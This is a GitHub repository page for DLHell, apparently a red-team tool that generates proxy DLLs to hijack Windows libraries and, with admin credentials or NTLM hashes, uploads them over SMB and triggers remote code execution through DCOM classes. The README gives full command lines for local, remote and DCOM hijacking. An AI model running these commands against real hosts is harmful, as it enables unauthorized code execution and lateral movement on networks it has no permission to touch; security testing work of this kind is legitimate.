# https://github.com/synacktiv/DLHell

[Skip to content](https://github.com/synacktiv/DLHell#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/synacktiv/DLHell) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/synacktiv/DLHell) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/synacktiv/DLHell) to refresh your session.Dismiss alert

{{ message }}

[synacktiv](https://github.com/synacktiv)/ **[DLHell](https://github.com/synacktiv/DLHell)** Public

- [Notifications](https://github.com/login?return_to=%2Fsynacktiv%2FDLHell) You must be signed in to change notification settings
- [Fork\\
23](https://github.com/login?return_to=%2Fsynacktiv%2FDLHell)
- [Star\\
170](https://github.com/login?return_to=%2Fsynacktiv%2FDLHell)


Local & remote Windows DLL Proxying


[170\\
stars](https://github.com/synacktiv/DLHell/stargazers) [23\\
forks](https://github.com/synacktiv/DLHell/forks) [Branches](https://github.com/synacktiv/DLHell/branches) [Tags](https://github.com/synacktiv/DLHell/tags) [Activity](https://github.com/synacktiv/DLHell/activity)

[Star](https://github.com/login?return_to=%2Fsynacktiv%2FDLHell)

[Notifications](https://github.com/login?return_to=%2Fsynacktiv%2FDLHell) You must be signed in to change notification settings

# synacktiv/DLHell

main

[**1** Branch](https://github.com/synacktiv/DLHell/branches) [**0** Tags](https://github.com/synacktiv/DLHell/tags)

[Go to Branches page](https://github.com/synacktiv/DLHell/branches)[Go to Tags page](https://github.com/synacktiv/DLHell/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![flashlam](https://avatars.githubusercontent.com/u/148257077?v=4&size=40)](https://github.com/flashlam)[flashlam](https://github.com/synacktiv/DLHell/commits?author=flashlam)<br>[Update DLHell.py](https://github.com/synacktiv/DLHell/commit/5cb5e6df5b2c6d408065c7fa7ebdc43011a0f298)<br>2 years agoJun 17, 2024<br>[5cb5e6d](https://github.com/synacktiv/DLHell/commit/5cb5e6df5b2c6d408065c7fa7ebdc43011a0f298) · 2 years agoJun 17, 2024<br>## History<br>[3 Commits](https://github.com/synacktiv/DLHell/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/synacktiv/DLHell/commits/main/) 3 Commits |
| [DLHell.py](https://github.com/synacktiv/DLHell/blob/main/DLHell.py "DLHell.py") | [DLHell.py](https://github.com/synacktiv/DLHell/blob/main/DLHell.py "DLHell.py") | [Update DLHell.py](https://github.com/synacktiv/DLHell/commit/5cb5e6df5b2c6d408065c7fa7ebdc43011a0f298 "Update DLHell.py") | 2 years agoJun 17, 2024 |
| [README.md](https://github.com/synacktiv/DLHell/blob/main/README.md "README.md") | [README.md](https://github.com/synacktiv/DLHell/blob/main/README.md "README.md") | [Update README.md](https://github.com/synacktiv/DLHell/commit/f2aadaaaa8aab072ba1f8965278145bb23cfa055 "Update README.md") | 2 years agoApr 17, 2024 |
| [dcom.json](https://github.com/synacktiv/DLHell/blob/main/dcom.json "dcom.json") | [dcom.json](https://github.com/synacktiv/DLHell/blob/main/dcom.json "dcom.json") | [first commit](https://github.com/synacktiv/DLHell/commit/78959f54e1b228f84b9f22d6a19b8145cdd2b2ad "first commit") | 2 years agoApr 17, 2024 |
| [project.toml](https://github.com/synacktiv/DLHell/blob/main/project.toml "project.toml") | [project.toml](https://github.com/synacktiv/DLHell/blob/main/project.toml "project.toml") | [first commit](https://github.com/synacktiv/DLHell/commit/78959f54e1b228f84b9f22d6a19b8145cdd2b2ad "first commit") | 2 years agoApr 17, 2024 |
| [requirements.txt](https://github.com/synacktiv/DLHell/blob/main/requirements.txt "requirements.txt") | [requirements.txt](https://github.com/synacktiv/DLHell/blob/main/requirements.txt "requirements.txt") | [first commit](https://github.com/synacktiv/DLHell/commit/78959f54e1b228f84b9f22d6a19b8145cdd2b2ad "first commit") | 2 years agoApr 17, 2024 |
| [template.tpe](https://github.com/synacktiv/DLHell/blob/main/template.tpe "template.tpe") | [template.tpe](https://github.com/synacktiv/DLHell/blob/main/template.tpe "template.tpe") | [first commit](https://github.com/synacktiv/DLHell/commit/78959f54e1b228f84b9f22d6a19b8145cdd2b2ad "first commit") | 2 years agoApr 17, 2024 |
| View all files |

## Repository files navigation

# DLHell

[Permalink: DLHell](https://github.com/synacktiv/DLHell#dlhell)

DLHell performs DCOM local & remote Windows DLL Proxying.

## Install

[Permalink: Install](https://github.com/synacktiv/DLHell#install)

The following packages are required (might depend on your distro, the following
example is for Debian 12):

```
sudo apt install -y g++-mingw-w64-x86-64-win32 binutils-mingw-w64-x86-64
```

Install pip dependencies:

```
pip3 install -r requirements.txt
```

## Quick start

[Permalink: Quick start](https://github.com/synacktiv/DLHell#quick-start)

The following command hijacks the `netutils.dll` library on host `10.137.0.48`
from the `template.tpe` template file (C++ source hijack library) which
launches `calc.exe`. Both original & proxy DLL will be placed in the `program files/windows nt/accessories/` folder of the `C$` share on the remote target.

Please use Impacket syntax for the `-remote-target` option.

```
DLHell.py -t template.tpe -c 'calc.exe' -remote-lib 'windows/system32/netutils.dll' -remote-target 'program files/windows nt/accessories/test.dll' -target 'domain/user:password@ip'
```

Kerberos authentication can also be used:

```
DLHell.py -t template.tpe -c 'calc.exe' -k -target wks-02.vault-tech.com -progid WordPad.Document.1
```

List available CLSID & ProgIDs:

```
DLHell.py -list
```

## Usage

[Permalink: Usage](https://github.com/synacktiv/DLHell#usage)

```
 ____  _     _   _      _ _
|  _ \| |   | | | | ___| | |
| | | | |   | |_| |/ _ \ | |
| |_| | |___|  _  |  __/ | |
|____/|_____|_| |_|\___|_|_|

DLHell v1.0

usage: DLHell.py [-h] [-local-lib LOCAL_LIB] [-remote-lib REMOTE_LIB] [-local-target LOCAL_TARGET]
                 [-remote-target REMOTE_TARGET] [-target TARGET] [-clsid CLSID] [-progid PROGID] -t T -c C
                 [-u U] [-l] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address]
                 [-target-ip ip address] [-port [destination port]]

DLL Hell - DLL Proxifier/Hijacker

options:
  -h, --help            show this help message and exit
  -local-lib LOCAL_LIB  Path of the remote library on the local system, ex: version.dll
  -remote-lib REMOTE_LIB
                        Path of the library on the remote system, ex: windows/system32/version.dll. WARNING:
                        Will connect using SMB on C$ share. Admin rights needed. Requires -target
  -local-target LOCAL_TARGET
                        The new name of the local output proxyfied library
  -remote-target REMOTE_TARGET
                        The new name of the remote proxyfied library. WARNING: Will connect using SMB on C$
                        share. Admin rights needed. Requires -target
  -target TARGET        [[domain/]username[:password]@]<targetName or address>
  -clsid CLSID          CLSID of DCOM class to activate
  -progid PROGID        ProgID of DCOM class to activate
  -t T, -template T     Template file to use for lib generation
  -c C, -command C      Command to execute using hijacked lib
  -u U, -user U         Name of the user to hijack (used to put DLLs in localappdata folder)
  -l, -list             Lists vulnerable CLSID & ProgID for DCOM Hijacking

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on
                        target parameters. If valid credentials cannot be found, it will use the ones
                        specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN)
                        specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as
                        target. This is useful when target is the NetBIOS name and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server
```

## Local DLL Proxying

[Permalink: Local DLL Proxying](https://github.com/synacktiv/DLHell#local-dll-proxying)

For Local DLL crafting, use the `-local-lib` (name of the proxy DLL) and
`-local-target` (renamed original DLL) options:

```
DLHell.py -t template.tpe -c 'calc.exe' -local-lib 'lib/netutils.dll' -local-target 'test.dll'
```

## Remote DLL Proxying (admin privileges required):

[Permalink: Remote DLL Proxying (admin privileges required):](https://github.com/synacktiv/DLHell#remote-dll-proxying-admin-privileges-required)

For remote DLL hijacking, specify the `-target`, `-remote-lib` (name of the
original DLL on the remote host) and `-local-target` (renamed original DLL)
options:

```
DLHell.py -t template.tpe -c 'calc.exe' -target 'domain/user:password@ip' -remote-lib 'windows/system32/PROPSYS.dll' -remote-target 'windows/test.dll'
```

## DCOM DLL Proxying (admin privileges needed)

[Permalink: DCOM DLL Proxying (admin privileges needed)](https://github.com/synacktiv/DLHell#dcom-dll-proxying-admin-privileges-needed)

DCOM DLL Proxying can be exploited using the `-progid` and `-clsid` options.
The list of available CLSIDs & ProgIDs is available with the following command:

```
DLHell.py -list
```

You can add new hijacks to the `dcom.json` file which defines paths for
vulnerable libraries:

Then, only the ProgID or CLSID are required to:

- Get the original DLL
- Create and compile the hijack library
- Upload the libraries on the remote host
- Activate the remote DCOM class

Example for ProgID `WordPad.Document.1`:

```
DLHell.py -t template.tpe -c 'calc.exe' -target 'domain/user:password@ip' -progid WordPad.Document.1
```

Example for CLSID `73FDDC80-AEA9-101A-98A7-00AA00374959`:

```
DLHell.py -t template.tpe -c 'calc.exe' -target 'domain/user:password@ip' -clsid 73FDDC80-AEA9-101A-98A7-00AA00374959
```

## About

Local & remote Windows DLL Proxying


### Resources

[Readme](https://github.com/synacktiv/DLHell#readme-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/synacktiv/DLHell).

[Activity](https://github.com/synacktiv/DLHell/activity)

[Custom properties](https://github.com/synacktiv/DLHell/custom-properties)

### Stars

[**170**\\
stars](https://github.com/synacktiv/DLHell/stargazers)

### Watchers

[**4**\\
watching](https://github.com/synacktiv/DLHell/watchers)

### Forks

[**23**\\
forks](https://github.com/synacktiv/DLHell/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fsynacktiv%2FDLHell&report=synacktiv+%28user%29)

## [Releases](https://github.com/synacktiv/DLHell/releases)

No releases published

## [Packages\  0](https://github.com/orgs/synacktiv/packages?repo_name=DLHell)

No packages published

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/synacktiv/DLHell).

## Languages

- [Python100.0%](https://github.com/synacktiv/DLHell/search?l=python)

You can’t perform that action at this time.